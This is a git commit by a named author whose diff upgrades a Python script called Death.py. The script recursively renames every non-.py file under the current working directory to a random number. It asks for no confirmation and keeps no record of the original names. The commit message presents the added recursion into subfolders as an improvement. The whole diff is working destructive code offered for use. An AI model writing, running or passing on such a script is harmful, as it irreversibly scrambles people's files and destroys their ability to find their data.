13531738442814f7a5b09715fc47abb0218abfb5
Saurabh <saurabhguptarock119@gmail.com>
2020-11-10 22:27:46 +0530

    Upgraded to V2 with many new Bug Fixes and Improvements.
    Now the script can automatically go into a directory and rename files

--- Death.py
+++ Death.py
@@ -1,10 +1,48 @@
 import os
 import random
-while True:
-    for filename in os.listdir():
-        try:
-            foldername = os.listdir(filename)
-            for file in foldername:
-                os.rename('{}\\{}'.format(filename,file), str(random.random()))
-        except NotADirectoryError:
-            os.rename(filename, str(random.random()))
+
+
+def noDirectoryInCurrentDirectory(dirname):
+    flag = True
+    dirNames = []
+    for filename in os.listdir(dirname):
+        if os.path.isdir(dirname + "\\" + filename):
+            flag = False
+            dirNames.append(dirname + "\\" + filename)
+        else:
+            continue
+    return flag, dirNames
+
+
+def renameFilesInDirectory(dirName):
+    flag, dirNames = noDirectoryInCurrentDirectory(dirName)
+    if flag:
+        filenames = os.listdir(dirName)
+        for i, filename in enumerate(filenames):
+            filenames[i] = dirName + "\\" + filename
+
+        for filename in filenames:
+            if filename.find(".py") == -1:
+                os.rename(filename, dirName + "\\" + str(random.random()))
+
+    else:
+        filenames = os.listdir(dirName)
+        for i, filename in enumerate(filenames):
+            filenames[i] = dirName + "\\" + filename
+
+        for dirName in dirNames:
+            filenames.remove(dirName)
+
+        for filename in filenames:
+            if filename.find(".py") == -1:
+                os.rename(
+                    filename,
+                    "\\".join(dirName.split("\\")[:-1]) + "\\" + str(random.random()),
+                )
+
+        for name in dirNames:
+            renameFilesInDirectory(name)
+
+
+renameFilesInDirectory(os.getcwd())
+
